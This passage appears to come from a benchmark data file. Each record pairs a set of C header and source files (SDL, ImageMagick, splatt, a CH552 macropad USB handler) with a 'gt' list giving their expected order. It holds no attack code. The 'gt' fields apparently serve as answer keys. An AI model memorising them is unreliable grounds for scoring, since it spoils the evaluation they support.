0;\n\n}\n\n\n\n\n\nvoid HID_EP1_IN(void) {\n\n  UEP1_T_LEN = 0;\n\n  UEP1_CTRL = UEP1_CTRL & ~MASK_UEP_T_RES | UEP_T_RES_NAK;\n\n  HID_EP1_writeBusyFlag = 0;\n\n}\n\n\n\n\n\nvoid HID_EP2_OUT(void) {\n\n}\n\n",
        "gt": [
            "'CH552-MacroPad-plus/software/src/config.h'",
            "'CH552-MacroPad-plus/software/src/usb_descr.h'",
            "'CH552-MacroPad-plus/software/src/usb_handler.h'",
            "'CH552-MacroPad-plus/software/src/usb_hid.h'",
            "'CH552-MacroPad-plus/software/src/usb_hid.c'"
        ]
    },
    {
        "files": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_images.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_log.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_compare.h'"
        ],
        "content": "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'\n:\n\n\n\n\n#ifndef _SDL_H\n#define _SDL_H\n\n#include \"SDL_main.h\"\n#include \"SDL_stdinc.h\"\n#include \"SDL_assert.h\"\n#include \"SDL_atomic.h\"\n#include \"SDL_audio.h\"\n#include \"SDL_clipboard.h\"\n#include \"SDL_cpuinfo.h\"\n#include \"SDL_endian.h\"\n#include \"SDL_error.h\"\n#include \"SDL_events.h\"\n#include \"SDL_filesystem.h\"\n#include \"SDL_joystick.h\"\n#include \"SDL_gamecontroller.h\"\n#include \"SDL_haptic.h\"\n#include \"SDL_hints.h\"\n#include \"SDL_loadso.h\"\n#include \"SDL_log.h\"\n#include \"SDL_messagebox.h\"\n#include \"SDL_mutex.h\"\n#include \"SDL_power.h\"\n#include \"SDL_render.h\"\n#include \"SDL_rwops.h\"\n#include \"SDL_system.h\"\n#include \"SDL_thread.h\"\n#include \"SDL_timer.h\"\n#include \"SDL_version.h\"\n#include \"SDL_video.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n\n#define SDL_INIT_TIMER          0x00000001u\n#define SDL_INIT_AUDIO          0x00000010u\n#define SDL_INIT_VIDEO          0x00000020u\n#define SDL_INIT_JOYSTICK       0x00000200u\n#define SDL_INIT_HAPTIC         0x00001000u\n#define SDL_INIT_GAMECONTROLLER 0x00002000u\n#define SDL_INIT_EVENTS         0x00004000u\n#define SDL_INIT_NOPARACHUTE    0x00100000u\n#define SDL_INIT_EVERYTHING ( \\\n                SDL_INIT_TIMER | SDL_INIT_AUDIO | SDL_INIT_VIDEO | SDL_INIT_EVENTS | \\\n                SDL_INIT_JOYSTICK | SDL_INIT_HAPTIC | SDL_INIT_GAMECONTROLLER \\\n            )\n\n\n\nextern DECLSPEC int SDLCALL SDL_Init(Uint32 flags);\n\n\nextern DECLSPEC int SDLCALL SDL_InitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_QuitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC Uint32 SDLCALL SDL_WasInit(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_Quit(void);\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_images.h'\n:\n\n\n\n\n\n#ifndef _SDL_test_images_h\n#define _SDL_test_images_h\n\n#include \"SDL.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\ntypedef struct SDLTest_SurfaceImage_s {\n  int width;\n  int height;\n  unsigned int bytes_per_pixel;\n  const char *pixel_data;\n} SDLTest_SurfaceImage_t;\n\n\nSDL_Surface *SDLTest_ImageBlit();\nSDL_Surface *SDLTest_ImageBlitColor();\nSDL_Surface *SDLTest_ImageBlitAlpha();\nSDL_Surface *SDLTest_ImageBlitBlendAdd();\nSDL_Surface *SDLTest_ImageBlitBlend();\nSDL_Surface *SDLTest_ImageBlitBlendMod();\nSDL_Surface *SDLTest_ImageBlitBlendNone();\nSDL_Surface *SDLTest_ImageBlitBlendAll();\nSDL_Surface *SDLTest_ImageFace();\nSDL_Surface *SDLTest_ImagePrimitives();\nSDL_Surface *SDLTest_ImagePrimitivesBlend();\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'\n:\n\n\n\n#ifndef _SDL_test_h\n#define _SDL_test_h\n\n#include \"SDL.h\"\n#include \"SDL_test_common.h\"\n#include \"SDL_test_font.h\"\n#include \"SDL_test_random.h\"\n#include \"SDL_test_fuzzer.h\"\n#include \"SDL_test_crc32.h\"\n#include \"SDL_test_md5.h\"\n#include \"SDL_test_log.h\"\n#include \"SDL_test_assert.h\"\n#include \"SDL_test_harness.h\"\n#include \"SDL_test_images.h\"\n#include \"SDL_test_compare.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n#define SDLTEST_MAX_LOGMESSAGE_LENGTH   3584\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_log.h'\n:\n\n\n\n#ifndef _SDL_log_h\n#define _SDL_log_h\n\n#include \"SDL_stdinc.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n#define SDL_MAX_LOG_MESSAGE 4096\n\n\nenum\n{\n    SDL_LOG_CATEGORY_APPLICATION,\n    SDL_LOG_CATEGORY_ERROR,\n    SDL_LOG_CATEGORY_ASSERT,\n    SDL_LOG_CATEGORY_SYSTEM,\n    SDL_LOG_CATEGORY_AUDIO,\n    SDL_LOG_CATEGORY_VIDEO,\n    SDL_LOG_CATEGORY_RENDER,\n    SDL_LOG_CATEGORY_INPUT,\n    SDL_LOG_CATEGORY_TEST,\n\n\n    SDL_LOG_CATEGORY_RESERVED1,\n    SDL_LOG_CATEGORY_RESERVED2,\n    SDL_LOG_CATEGORY_RESERVED3,\n    SDL_LOG_CATEGORY_RESERVED4,\n    SDL_LOG_CATEGORY_RESERVED5,\n    SDL_LOG_CATEGORY_RESERVED6,\n    SDL_LOG_CATEGORY_RESERVED7,\n    SDL_LOG_CATEGORY_RESERVED8,\n    SDL_LOG_CATEGORY_RESERVED9,\n    SDL_LOG_CATEGORY_RESERVED10,\n\n\n    SDL_LOG_CATEGORY_CUSTOM\n};\n\n\ntypedef enum\n{\n    SDL_LOG_PRIORITY_VERBOSE = 1,\n    SDL_LOG_PRIORITY_DEBUG,\n    SDL_LOG_PRIORITY_INFO,\n    SDL_LOG_PRIORITY_WARN,\n    SDL_LOG_PRIORITY_ERROR,\n    SDL_LOG_PRIORITY_CRITICAL,\n    SDL_NUM_LOG_PRIORITIES\n} SDL_LogPriority;\n\n\n\nextern DECLSPEC void SDLCALL SDL_LogSetAllPriority(SDL_LogPriority priority);\n\n\nextern DECLSPEC void SDLCALL SDL_LogSetPriority(int category,\n                                                SDL_LogPriority priority);\n\n\nextern DECLSPEC SDL_LogPriority SDLCALL SDL_LogGetPriority(int category);\n\n\nextern DECLSPEC void SDLCALL SDL_LogResetPriorities(void);\n\n\nextern DECLSPEC void SDLCALL SDL_Log(SDL_PRINTF_FORMAT_STRING const char *fmt, ...) SDL_PRINTF_VARARG_FUNC(1);\n\n\nextern DECLSPEC void SDLCALL SDL_LogVerbose(int category, SDL_PRINTF_FORMAT_STRING const char *fmt, ...) SDL_PRINTF_VARARG_FUNC(2);\n\n\nextern DECLSPEC void SDLCALL SDL_LogDebug(int category, SDL_PRINTF_FORMAT_STRING const char *fmt, ...) SDL_PRINTF_VARARG_FUNC(2);\n\n\nextern DECLSPEC void SDLCALL SDL_LogInfo(int category, SDL_PRINTF_FORMAT_STRING const char *fmt, ...) SDL_PRINTF_VARARG_FUNC(2);\n\n\nextern DECLSPEC void SDLCALL SDL_LogWarn(int category, SDL_PRINTF_FORMAT_STRING const char *fmt, ...) SDL_PRINTF_VARARG_FUNC(2);\n\n\nextern DECLSPEC void SDLCALL SDL_LogError(int category, SDL_PRINTF_FORMAT_STRING const char *fmt, ...) SDL_PRINTF_VARARG_FUNC(2);\n\n\nextern DECLSPEC void SDLCALL SDL_LogCritical(int category, SDL_PRINTF_FORMAT_STRING const char *fmt, ...) SDL_PRINTF_VARARG_FUNC(2);\n\n\nextern DECLSPEC void SDLCALL SDL_LogMessage(int category,\n                                            SDL_LogPriority priority,\n                                            SDL_PRINTF_FORMAT_STRING const char *fmt, ...) SDL_PRINTF_VARARG_FUNC(3);\n\n\nextern DECLSPEC void SDLCALL SDL_LogMessageV(int category,\n                                             SDL_LogPriority priority,\n                                             const char *fmt, va_list ap);\n\n\ntypedef void (*SDL_LogOutputFunction)(void *userdata, int category, SDL_LogPriority priority, const char *message);\n\n\nextern DECLSPEC void SDLCALL SDL_LogGetOutputFunction(SDL_LogOutputFunction *callback, void **userdata);\n\n\nextern DECLSPEC void SDLCALL SDL_LogSetOutputFunction(SDL_LogOutputFunction callback, void *userdata);\n\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_compare.h'\n:\n\n\n\n\n\n#ifndef _SDL_test_compare_h\n#define _SDL_test_compare_h\n\n#include \"SDL.h\"\n\n#include \"SDL_test_images.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\nint SDLTest_CompareSurfaces(SDL_Surface *surface, SDL_Surface *referenceSurface, int allowable_error);\n\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n",
        "gt": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_log.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_images.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_compare.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'"
        ]
    },
    {
        "files": [
            "'canvas/_include/magick/coder.h'",
            "'canvas/_include/magick/MagickCore.h'",
            "'canvas/_include/wand/deprecate.h'",
            "'canvas/_include/wand/magick-wand.h'",
            "'canvas/_include/wand/MagickWand.h'",
            "'canvas/_include/wand/pixel-iterator.h'"
        ],
        "content": "'canvas/_include/magick/coder.h'\n:\n#ifndef _MAGICKCORE_CODER_H\n#define _MAGICKCORE_CODER_H\n\n#if defined(__cplusplus) || defined(c_plusplus)\nextern \"C\" {\n#endif\n\ntypedef struct _CoderInfo\n{\n  char\n    *path,\n    *magick,\n    *name;\n\n  MagickBooleanType\n    exempt,\n    stealth;\n\n  struct _CoderInfo\n    *previous,\n    *next;\n\n  size_t\n    signature;\n} CoderInfo;\n\nextern MagickExport char\n  **GetCoderList(const char *,size_t *,ExceptionInfo *);\n\nextern MagickExport const CoderInfo\n  *GetCoderInfo(const char *,ExceptionInfo *),\n  **GetCoderInfoList(const char *,size_t *,ExceptionInfo *);\n\nextern MagickExport MagickBooleanType\n  CoderComponentGenesis(void),\n  ListCoderInfo(FILE *,ExceptionInfo *);\n\nMagickExport void\n  CoderComponentTerminus(void);\n\n#if defined(__cplusplus) || defined(c_plusplus)\n}\n#endif\n\n#endif\n\n'canvas/_include/magick/MagickCore.h'\n:\n\n#ifndef _MAGICKCORE_CORE_H\n#define _MAGICKCORE_CORE_H\n\n#if defined(__cplusplus) || defined(c_plusplus)\nextern \"C\" {\n#endif\n\n#if !defined(_MAGICKCORE_CONFIG_H)\n# define _MAGICKCORE_CONFIG_H\n# if !defined(vms) && !defined(macintosh)\n#  include \"magick/magick-config.h\"\n# else\n#  include \"magick-config.h\"\n# endif\n#if defined(_magickcore_const) && !defined(const)\n# define const _magickcore_const\n#endif\n#if defined(_magickcore_inline) && !defined(inline)\n# define inline _magickcore_inline\n#endif\n#if defined(_magickcore_restrict) && !defined(restrict)\n# define restrict  _magickcore_restrict\n#endif\n# if defined(__cplusplus) || defined(c_plusplus)\n#  undef inline\n# endif\n#endif\n\n#include <stdio.h>\n#include <stdarg.h>\n#include <stdlib.h>\n#include <sys/types.h>\n\n#if defined(WIN32) || defined(WIN64)\n#  define MAGICKCORE_WINDOWS_SUPPORT\n#else\n#  define MAGICKCORE_POSIX_SUPPORT\n#endif\n\n#include \"magick/method-attribute.h\"\n\n#if defined(MAGICKCORE_NAMESPACE_PREFIX)\n# include \"magick/methods.h\"\n#endif\n#include \"magick/magick-type.h\"\n#include \"magick/accelerate.h\"\n#include \"magick/animate.h\"\n#include \"magick/annotate.h\"\n#include \"magick/artifact.h\"\n#include \"magick/attribute.h\"\n#include \"magick/blob.h\"\n#include \"magick/cache.h\"\n#include \"magick/cache-view.h\"\n#include \"magick/cipher.h\"\n#include \"magick/client.h\"\n#include \"magick/coder.h\"\n#include \"magick/color.h\"\n#include \"magick/colorspace.h\"\n#include \"magick/colormap.h\"\n#include \"magick/compare.h\"\n#include \"magick/composite.h\"\n#include \"magick/compress.h\"\n#include \"magick/configure.h\"\n#include \"magick/constitute.h\"\n#include \"magick/decorate.h\"\n#include \"magick/delegate.h\"\n#include \"magick/deprecate.h\"\n#include \"magick/display.h\"\n#include \"magick/distort.h\"\n#include \"magick/draw.h\"\n#include \"magick/effect.h\"\n#include \"magick/enhance.h\"\n#include \"magick/exception.h\"\n#include \"magick/feature.h\"\n#include \"magick/fourier.h\"\n#include \"magick/fx.h\"\n#include \"magick/gem.h\"\n#include \"magick/geometry.h\"\n#include \"magick/hashmap.h\"\n#include \"magick/histogram.h\"\n#include \"magick/identify.h\"\n#include \"magick/image.h\"\n#include \"magick/image-view.h\"\n#include \"magick/layer.h\"\n#include \"magick/list.h\"\n#include \"magick/locale_.h\"\n#include \"magick/log.h\"\n#include \"magick/magic.h\"\n#include \"magick/magick.h\"\n#include \"magick/matrix.h\"\n#include \"magick/memory_.h\"\n#include \"magick/module.h\"\n#include \"magick/mime.h\"\n#include \"magick/monitor.h\"\n#include \"magick/montage.h\"\n#include \"magick/morphology.h\"\n#include \"magick/option.h\"\n#include \"magick/paint.h\"\n#include \"magick/pixel.h\"\n#include \"magick/policy.h\"\n#include \"magick/prepress.h\"\n#include \"magick/profile.h\"\n#include \"magick/property.h\"\n#include \"magick/quantize.h\"\n#include \"magick/quantum.h\"\n#include \"magick/registry.h\"\n#include \"magick/random_.h\"\n#include \"magick/resample.h\"\n#include \"magick/resize.h\"\n#include \"magick/resource_.h\"\n#include \"magick/segment.h\"\n#include \"magick/shear.h\"\n#include \"magick/signature.h\"\n#include \"magick/splay-tree.h\"\n#include \"magick/stream.h\"\n#include \"magick/statistic.h\"\n#include \"magick/string_.h\"\n#include \"magick/timer.h\"\n#include \"magick/token.h\"\n#include \"magick/transform.h\"\n#include \"magick/threshold.h\"\n#include \"magick/type.h\"\n#include \"magick/utility.h\"\n#include \"magick/version.h\"\n#include \"magick/xml-tree.h\"\n#include \"magick/xwindow.h\"\n\n#if defined(__cplusplus) || defined(c_plusplus)\n}\n#endif\n\n#endif\n\n'canvas/_include/wand/deprecate.h'\n:\n#ifndef _MAGICKWAND_DEPRECATE_H\n#define _MAGICKWAND_DEPRECATE_H\n\n#if defined(__cplusplus) || defined(c_plusplus)\nextern \"C\" {\n#endif\n\n#if !defined(MAGICKCORE_EXCLUDE_DEPRECATED)\n\n#include \"wand/drawing-wand.h\"\n#include \"wand/magick-wand.h\"\n#include \"wand/pixel-iterator.h\"\n#include \"wand/pixel-wand.h\"\n\ntypedef struct _DrawingWand\n  *DrawContext;\n\ntypedef struct _PixelView\n  PixelView;\n\ntypedef MagickBooleanType\n  (*DuplexTransferPixelViewMethod)(const PixelView *,const PixelView *,\n    PixelView *,void *),\n  (*GetPixelViewMethod)(const PixelView *,void *),\n  (*SetPixelViewMethod)(PixelView *,void *),\n  (*TransferPixelViewMethod)(const PixelView *,PixelView *,void *),\n  (*UpdatePixelViewMethod)(PixelView *,void *);\n\nextern WandExport char\n  *GetPixelViewException(const PixelView *,ExceptionType *)\n    magick_attribute((deprecated));\n\nextern WandExport double\n  DrawGetFillAlpha(const DrawingWand *) magick_attribute((deprecated)),\n  DrawGetStrokeAlpha(const DrawingWand *) magick_attribute((deprecated));\n\nextern WandExport DrawInfo\n  *DrawPeekGraphicWand(const DrawingWand *) magick_attribute((deprecated));\n\nextern WandExport char\n  *MagickDescribeImage(MagickWand *) magick_attribute((deprecated)),\n  *MagickGetImageAttribute(MagickWand *,const char *)\n    magick_attribute((deprecated)),\n  *PixelIteratorGetException(const PixelIterator *,ExceptionType *)\n    magick_attribute((deprecated));\n\nextern WandExport ssize_t\n  MagickGetImageIndex(MagickWand *) magick_attribute((deprecated));\n\nextern WandExport MagickBooleanType\n  DuplexTransferPixelViewIterator(PixelView *,PixelView *,PixelView *,\n    DuplexTransferPixelViewMethod,void *) magick_attribute((deprecated)),\n  GetPixelViewIterator(PixelView *,GetPixelViewMethod,void *)\n    magick_attribute((deprecated)),\n  IsPixelView(const PixelView *) magick_attribute((deprecated)),\n  MagickClipPathImage(MagickWand *,const char *,const MagickBooleanType)\n    magick_attribute((deprecated)),\n  MagickColorFloodfillImage(MagickWand *,const PixelWand *,const double,\n    const PixelWand *,const ssize_t,const ssize_t)\n    magick_attribute((deprecated)),\n  MagickGetImageChannelExtrema(MagickWand *,const ChannelType,size_t *,\n    size_t *) magick_attribute((deprecated)),\n  MagickGetImageExtrema(MagickWand *,size_t *,size_t *)\n    magick_attribute((deprecated)),\n  MagickGetImageMatte(MagickWand *) magick_attribute((deprecated)),\n  MagickGetImagePixels(MagickWand *,const ssize_t,const ssize_t,const size_t,\n    const size_t,const char *,const StorageType,void *)\n    magick_attribute((deprecated)),\n  MagickMapImage(MagickWand *,const MagickWand *,const MagickBooleanType)\n    magick_attribute((deprecated)),\n  MagickMatteFloodfillImage(MagickWand *,const double,const double,\n    const PixelWand *,const ssize_t,const ssize_t)\n    magick_attribute((deprecated)),\n  MagickMedianFilterImage(MagickWand *,const double)\n    magick_attribute((deprecated)),\n  MagickModeImage(MagickWand *,const double) magick_attribute((deprecated)),\n  MagickReduceNoiseImage(MagickWand *,const double)\n    magick_attribute((deprecated)),\n  MagickRemapImage(MagickWand *,const MagickWand *,const DitherMethod),\n  MagickOpaqueImage(MagickWand *,const PixelWand *,const PixelWand *,\n    const double) magick_attribute((deprecated)),\n  MagickPaintFloodfillImage(MagickWand *,const ChannelType,const PixelWand *,\n    const double,const PixelWand *,const ssize_t,const ssize_t)\n    magick_attribute((deprecated)),\n  MagickPaintOpaqueImage(MagickWand *,const PixelWand *,const PixelWand *,\n    const double) magick_attribute((deprecated)),\n  MagickPaintOpaqueImageChannel(MagickWand *,const ChannelType,\n    const PixelWand *,const PixelWand *,const double)\n    magick_attribute((deprecated)),\n  MagickPaintTransparentImage(MagickWand *,const PixelWand *,const double,\n    const double) magick_attribute((deprecated)),\n  MagickRecolorImage(MagickWand *,const size_t,const double *)\n    magick_attribute((deprecated)),\n  MagickSetImageAttribute(MagickWand *,const char *,const char *)\n    magick_attribute((deprecated)),\n  MagickSetImageIndex(MagickWand *,const ssize_t)\n    magick_attribute((deprecated)),\n  MagickSetImageOption(MagickWand *,const char *,const char *,const char *)\n    magick_attribute((deprecated)),\n  MagickSetImagePixels(MagickWand *,const ssize_t,const ssize_t,const size_t,\n    const size_t,const char *,const StorageType,const void *)\n    magick_attribute((deprecated)),\n  MagickTransparentImage(MagickWand *,const PixelWand *,const double,\n    const double) magick_attribute((deprecated)),\n  SetPixelViewIterator(PixelView *,SetPixelViewMethod,void *)\n    magick_attribute((deprecated)),\n  TransferPixelViewIterator(PixelView *,PixelView *,TransferPixelViewMethod,\n    void *) magick_attribute((deprecated)),\n  UpdatePixelViewIterator(PixelView *,UpdatePixelViewMethod,void *)\n    magick_attribute((deprecated));\n\nextern WandExport MagickWand\n  *GetPixelViewWand(const PixelView *) magick_attribute((deprecated)),\n  *MagickAverageImages(MagickWand *) magick_attribute((deprecated)),\n  *MagickFlattenImages(MagickWand *) magick_attribute((deprecated)),\n  *MagickMaximumImages(MagickWand *) magick_attribute((deprecated)),\n  *MagickMinimumImages(MagickWand *) magick_attribute((deprecated)),\n  *MagickMosaicImages(MagickWand *) magick_attribute((deprecated)),\n  *MagickRegionOfInterestImage(MagickWand *,const size_t,const size_t,\n    const ssize_t,const ssize_t) magick_attribute((deprecated));\n\nextern WandExport MagickSizeType\n  MagickGetImageSize(MagickWand *) magick_attribute((deprecated));\n\nextern WandExport PixelView\n  *ClonePixelView(const PixelView *) magick_attribute((deprecated)),\n  *DestroyPixelView(PixelView *) magick_attribute((deprecated)),\n  *NewPixelView(MagickWand *) magick_attribute((deprecated)),\n  *NewPixelViewRegion(MagickWand *,const ssize_t,const ssize_t,const size_t,\n    const size_t) magick_attribute((deprecated));\n\nextern WandExport PixelWand\n  **GetPixelViewPixels(const PixelView *) magick_attribute((deprecated)),\n  **PixelGetNextRow(PixelIterator *) magick_attribute((deprecated));\n\nextern WandExport size_t\n  GetPixelViewHeight(const PixelView *) magick_attribute((deprecated)),\n  GetPixelViewWidth(const PixelView *) magick_attribute((deprecated));\n\nextern WandExport ssize_t\n  GetPixelViewX(const PixelView *) magick_attribute((deprecated)),\n  GetPixelViewY(const PixelView *) magick_attribute((deprecated));\n\nextern WandExport unsigned char\n  *MagickWriteImageBlob(MagickWand *,size_t *) magick_attribute((deprecated));\n\nextern WandExport void\n  DrawPopGraphicContext(DrawingWand *) magick_attribute((deprecated)),\n  DrawPushGraphicContext(DrawingWand *) magick_attribute((deprecated)),\n  DrawSetFillAlpha(DrawingWand *,const double) magick_attribute((deprecated)),\n  DrawSetStrokeAlpha(DrawingWand *,const double) magick_attribute((deprecated));\n\n#endif\n\n#if defined(__cplusplus) || defined(c_plusplus)\n}\n#endif\n\n#endif\n\n'canvas/_include/wand/magick-wand.h'\n:\n\n#ifndef _MAGICKWAND_MAGICK_WAND_DEPRECATED_H\n#define _MAGICKWAND_MAGICK_WAND_DEPRECATED_H\n\n#include \"wand/MagickWand.h\"\n\n#endif\n\n'canvas/_include/wand/MagickWand.h'\n:\n\n#ifndef _MAGICK_WAND_H\n#define _MAGICK_WAND_H\n\n#if defined(__cplusplus) || defined(c_plusplus)\nextern \"C\" {\n#endif\n\n#if !defined(_MAGICKWAND_CONFIG_H)\n# define _MAGICKWAND_CONFIG_H\n# if !defined(vms) && !defined(macintosh)\n#  include \"magick/magick-config.h\"\n# else\n#  include \"magick-config.h\"\n# endif\n#if defined(_magickcore_const) && !defined(const)\n# define const _magickcore_const\n#endif\n#if defined(_magickcore_inline) && !defined(inline)\n# define inline _magickcore_inline\n#endif\n#if defined(_magickcore_restrict) && !defined(restrict)\n# define restrict  _magickcore_restrict\n#endif\n# if defined(__cplusplus) || defined(c_plusplus)\n#  undef inline\n# endif\n#endif\n\n#include <stdio.h>\n#include <stdarg.h>\n#include <stdlib.h>\n#include <sys/types.h>\n\n#if defined(WIN32) || defined(WIN64)\n#  define MAGICKCORE_WINDOWS_SUPPORT\n#else\n#  define MAGICKCORE_POSIX_SUPPORT\n#endif\n\ntypedef struct _MagickWand\n  MagickWand;\n\n#include \"wand/method-attribute.h\"\n#include \"magick/MagickCore.h\"\n#include \"wand/animate.h\"\n#include \"wand/compare.h\"\n#include \"wand/composite.h\"\n#include \"wand/conjure.h\"\n#include \"wand/convert.h\"\n#include \"wand/deprecate.h\"\n#include \"wand/display.h\"\n#include \"wand/drawing-wand.h\"\n#include \"wand/identify.h\"\n#include \"wand/import.h\"\n#include \"wand/magick-property.h\"\n#include \"wand/magick-image.h\"\n#include \"wand/mogrify.h\"\n#include \"wand/montage.h\"\n#include \"wand/pixel-iterator.h\"\n#include \"wand/pixel-wand.h\"\n#include \"wand/stream.h\"\n#include \"wand/wand-view.h\"\n\nextern WandExport char\n  *MagickGetException(const MagickWand *,ExceptionType *);\n\nextern WandExport ExceptionType\n  MagickGetExceptionType(const MagickWand *);\n\nextern WandExport MagickBooleanType\n  IsMagickWand(const MagickWand *),\n  MagickClearException(MagickWand *),\n  MagickSetIteratorIndex(MagickWand *,const ssize_t);\n\nextern WandExport MagickWand\n  *CloneMagickWand(const MagickWand *),\n  *DestroyMagickWand(MagickWand *),\n  *NewMagickWand(void),\n  *NewMagickWandFromImage(const Image *);\n\nextern WandExport ssize_t\n  MagickGetIteratorIndex(MagickWand *);\n\nextern WandExport void\n  ClearMagickWand(MagickWand *),\n  MagickWandGenesis(void),\n  MagickWandTerminus(void),\n  *MagickRelinquishMemory(void *),\n  MagickResetIterator(MagickWand *),\n  MagickSetFirstIterator(MagickWand *),\n  MagickSetLastIterator(MagickWand *);\n\n#if defined(__cplusplus) || defined(c_plusplus)\n}\n#endif\n\n#endif\n\n'canvas/_include/wand/pixel-iterator.h'\n:\n#ifndef _MAGICKWAND_PIXEL_ITERATOR_H\n#define _MAGICKWAND_PIXEL_ITERATOR_H\n\n#if defined(__cplusplus) || defined(c_plusplus)\nextern \"C\" {\n#endif\n\n#include \"wand/magick-wand.h\"\n#include \"wand/pixel-wand.h\"\n\ntypedef struct _PixelIterator\n  PixelIterator;\n\nextern WandExport char\n  *PixelGetIteratorException(const PixelIterator *,ExceptionType *);\n\nextern WandExport ExceptionType\n  PixelGetIteratorExceptionType(const PixelIterator *);\n\nextern WandExport MagickBooleanType\n  IsPixelIterator(const PixelIterator *),\n  PixelClearIteratorException(PixelIterator *),\n  PixelSetIteratorRow(PixelIterator *,const ssize_t),\n  PixelSyncIterator(PixelIterator *);\n\nextern WandExport PixelIterator\n  *ClonePixelIterator(const PixelIterator *),\n  *DestroyPixelIterator(PixelIterator *),\n  *NewPixelIterator(MagickWand *),\n  *NewPixelRegionIterator(MagickWand *,const ssize_t,const ssize_t,const size_t,\n    const size_t);\n\nextern WandExport PixelWand\n  **PixelGetCurrentIteratorRow(PixelIterator *,size_t *),\n  **PixelGetNextIteratorRow(PixelIterator *,size_t *),\n  **PixelGetPreviousIteratorRow(PixelIterator *,size_t *);\n\nextern WandExport ssize_t\n  PixelGetIteratorRow(PixelIterator *);\n\nextern WandExport void\n  ClearPixelIterator(PixelIterator *),\n  PixelResetIterator(PixelIterator *),\n  PixelSetFirstIteratorRow(PixelIterator *),\n  PixelSetLastIteratorRow(PixelIterator *);\n\n#if defined(__cplusplus) || defined(c_plusplus)\n}\n#endif\n\n#endif\n",
        "gt": [
            "'canvas/_include/magick/coder.h'",
            "'canvas/_include/magick/MagickCore.h'",
            "'canvas/_include/wand/MagickWand.h'",
            "'canvas/_include/wand/magick-wand.h'",
            "'canvas/_include/wand/pixel-iterator.h'",
            "'canvas/_include/wand/deprecate.h'"
        ]
    },
    {
        "files": [
            "'splatt/include/splatt.h'",
            "'splatt/matlab/splatt_shared.h'",
            "'splatt/include/splatt/api_options.h'",
            "'splatt/matlab/splatt_load.c'"
        ],
        "content": "'splatt/include/splatt.h'\n:\n\n\n\n#ifndef SPLATT_SPLATT_H\n#define SPLATT_SPLATT_H\n\n\n\n\n\n#ifdef SPLATT_USE_MPI\n#include <mpi.h>\n#endif\n\n\n\n\n\n\n\n#include \"splatt/types.h\"\n#include \"splatt/constants.h\"\n#include \"splatt/structs.h\"\n\n\n\n\n#include \"splatt/api_csf.h\"\n#include \"splatt/api_factorization.h\"\n#include \"splatt/api_kernels.h\"\n#include \"splatt/api_kruskal.h\"\n#include \"splatt/api_mpi.h\"\n#include \"splatt/api_options.h\"\n#include \"splatt/api_version.h\"\n\n#endif\n\n'splatt/matlab/splatt_shared.h'\n:#ifndef SPLATTLAB_SHARED_H\n#define SPLATTLAB_SHARED_H\n\n#include <splatt.h>\n#include <stdio.h>\n\n\n\n\n\n\nstatic uint64_t * p_get_uint64_data(\n    mxArray const * const mxstruct,\n    char const * const field)\n{\n  return (uint64_t *) mxGetData(mxGetField(mxstruct, 0, field));\n}\n\n\nstatic double * p_get_double_data(\n    mxArray const * const mxstruct,\n    char const * const field)\n{\n  return (double *) mxGetData(mxGetField(mxstruct, 0, field));\n}\n\n\n\nstatic int * p_get_int_data(\n    mxArray const * const mxstruct,\n    char const * const field)\n{\n  return (int *) mxGetData(mxGetField(mxstruct, 0, field));\n}\n\n\n\nstatic void p_mk_int32(\n    mxArray * const mxstruct,\n    char const * const field,\n    splatt_idx_t const len,\n    int32_t const * const vals)\n{\n  mxSetField(mxstruct, 0, field,\n      mxCreateNumericMatrix(1, len, mxINT32_CLASS, mxREAL));\n  memcpy(p_get_uint64_data(mxstruct, field), vals, len * sizeof(int32_t));\n}\n\n\n\nstatic void p_mk_uint64(\n    mxArray * const mxstruct,\n    char const * const field,\n    splatt_idx_t const len,\n    splatt_idx_t const * const vals)\n{\n  mxSetField(mxstruct, 0, field,\n      mxCreateNumericMatrix(1, len, mxUINT64_CLASS, mxREAL));\n  memcpy(p_get_uint64_data(mxstruct, field), vals, len * 